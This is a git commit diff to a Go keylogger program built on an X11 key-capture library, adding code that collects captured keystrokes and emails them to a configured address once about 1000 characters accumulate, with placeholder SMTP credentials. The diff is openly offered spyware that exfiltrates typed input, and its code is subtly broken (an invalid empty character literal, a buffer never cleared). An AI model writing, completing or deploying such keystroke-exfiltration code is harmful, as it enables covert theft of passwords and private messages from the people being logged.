0e0b502168823c9421f98791026f470d98304296
Mikołaj Lubiak <lubiak@proton.me>
2023-05-26 20:54:46 +0200

    Upload the logged keys to your email

--- main.go
+++ main.go
@@ -2,6 +2,9 @@ package main
 
 import (
 	"log"
+	"strings"
+	"kl/mail"
+	"time"
 
 	"github.com/ljesparis/x11goklogger/pkg/kl"
 	"github.com/ljesparis/x11goklogger/pkg/utils"
@@ -22,16 +25,32 @@ func main() {
 		panicIfError(err)
 	})
 
+	var data strings.Builder
 	var bff string
+
+	email := &mail.Email{
+		From:       "FROM",
+		Password:   `PASSWORD`,
+		ServerHost: "SERVER",
+		ServerPort: "PORT",
+		To:         []string{"TO"},
+		Subject:    time.Now().Format("2006-01-02 15:04:05"),
+		Body:       '',
+	}
+
 	kl.StartReadingInput(func(n string) {
 		if n == "\n" {
 			if len(bff) > 0 {
-				log.Println(bff)
+				data.WriteString(bff)
 			}
 
 			bff = ""
 		} else {
 			bff += n
+		}
+		if len(data.String()) >= 1000 {
+			email.Body = data.String()
+			email.Send()
 		}
 	})
 }
